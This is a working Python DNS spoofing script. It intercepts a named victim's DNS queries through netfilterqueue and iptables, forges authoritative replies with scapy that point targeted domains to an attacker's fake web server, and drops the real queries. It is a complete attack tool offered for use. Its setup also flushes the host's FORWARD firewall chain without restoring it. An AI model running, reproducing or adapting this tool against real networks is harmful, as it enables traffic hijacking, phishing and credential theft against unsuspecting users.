#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import os
import sys
import argparse

# Global variables will be set by main()
TARGET_MAP = {}
VICTIM_IP = None
GATEWAY_IP = None
ATTACKER_IP = None

def load_targets(filepath, default_ip):
    """
    Loads targets from a text file.
    If an IP is not specified, use the default_ip (attacker's IP).
    """
    global TARGET_MAP
    print(f"[*] Loading targets from '{filepath}'...")
    try:
        with open(filepath, "r") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                
                parts = line.split()
                domain = parts[0]
                ip = parts[1] if len(parts) > 1 else default_ip
                
                domain_bytes = (domain + ".").encode('utf-8')
                TARGET_MAP[domain_bytes] = ip
        
        if not TARGET_MAP:
            print("[!] No valid targets loaded. Exiting.")
            sys.exit(1)
        
        print(f"[*] Targets loaded ({len(TARGET_MAP)}):")
        for k, v in TARGET_MAP.items():
            print(f"    {k.decode('utf-8')} -> {v}")
            
    except FileNotFoundError:
        print(f"[!] Error: Targets file not found: {filepath}", file=sys.stderr)
        sys.exit(1)

def process_packet(packet):
    """
    Callback for each packet intercepted in the NFQUEUE.
    """
    try:
        scapy_packet = scapy.IP(packet.get_payload())
        
        # Is it a DNS query (UDP/53)?
        if scapy_packet.haslayer(scapy.DNSQR) and scapy_packet.haslayer(scapy.UDP) and scapy_packet[scapy.DNS].qr == 0:
            
            # Is it from our victim?
            if scapy_packet[scapy.IP].src == VICTIM_IP:
                qname = scapy_packet[scapy.DNSQR].qname
                
                # Is it one of our targets?
                if qname in TARGET_MAP:
                    print(f"[+] Intercepted target: {qname.decode('utf-8')}")
                    
                    redirect_ip = TARGET_MAP[qname]
                    
                    # Build the fake response
                    spoofed_an = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
                    
                    spoofed_packet = scapy.IP(dst=scapy_packet[scapy.IP].src, src=scapy_packet[scapy.IP].dst) / \
                                     scapy.UDP(dport=scapy_packet[scapy.UDP].sport, sport=scapy_packet[scapy.UDP].dport) / \
                                     scapy.DNS(id=scapy_packet[scapy.DNS].id,
                                               qr=1, aa=1,
                                               qd=scapy_packet[scapy.DNSQR],
                                               an=spoofed_an)
                    
                    scapy.send(spoofed_packet, verbose=0)
                    
                    # Block the original packet
                    packet.drop()
                    return

        # Forward everything else (non-target queries, non-DNS traffic, etc.)
        packet.accept()

    except Exception as e:
        print(f"[!] Error in process_packet: {e}")
        packet.accept()

def setup_iptables(iface):
    """Sets up iptables rules to intercept traffic."""
    print("[*] Configuring iptables...")
    os.system("sudo iptables -F FORWARD")
    # Intercept FORWARD traffic on port 53
    rule = f"sudo iptables -I FORWARD -i {iface} -p udp --dport 53 -j NFQUEUE --queue-num 1"
    os.system(rule)
    print(f"[*] Rule set: {rule}")

def cleanup(iface):
    """Restores iptables."""
    print("\n[*] Restoring iptables...")
    rule = f"sudo iptables -D FORWARD -i {iface} -p udp --dport 53 -j NFQUEUE --queue-num 1"
    os.system(rule)
    print("[*] Exiting.")

def main():
    global VICTIM_IP, GATEWAY_IP, ATTACKER_IP
    
    if os.geteuid() != 0:
        print("[!] Error: Run the script with sudo.", file=sys.stderr)
        sys.exit(1)
        
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool (NFQUEUE Mode)")
    parser.add_argument("-i", "--interface", required=True, dest="interface", 
                        help="Victim's input interface (e.g., eth1)")
    parser.add_argument("-t", "--targets", required=True, dest="targets_file", 
                        help="Text file with targets (e.g., targets.txt)")
    parser.add_argument("-v", "--victim-ip", required=True, dest="victim_ip", 
                        help="Victim's IP (e.g., 192.168.100.2)")
    parser.add_argument("-g", "--gateway-ip", required=True, dest="gateway_ip",
                        help="Gateway IP (e.g., 192.168.100.1)")
    parser.add_argument("-a", "--attacker-ip", dest="attacker_ip", default="192.168.100.3",
                        help="Your fake web server IP (default: 192.168.100.3)")
    args = parser.parse_args()
    
    # Set global variables
    VICTIM_IP = args.victim_ip
    GATEWAY_IP = args.gateway_ip
    ATTACKER_IP = args.attacker_ip
    
    load_targets(args.targets_file, ATTACKER_IP)
    
    setup_iptables(args.interface)
    
    queue = netfilterqueue.NetfilterQueue()
    
    try:
        queue.bind(1, process_packet)
        print("[*] Waiting for DNS packets... (Press Ctrl+C to exit)")
        queue.run()
        
    except KeyboardInterrupt:
        cleanup(args.interface)
    except Exception as e:
        print(f"[!] Critical error: {e}")
        cleanup(args.interface)
        sys.exit(1)

if __name__ == "__main__":
    main()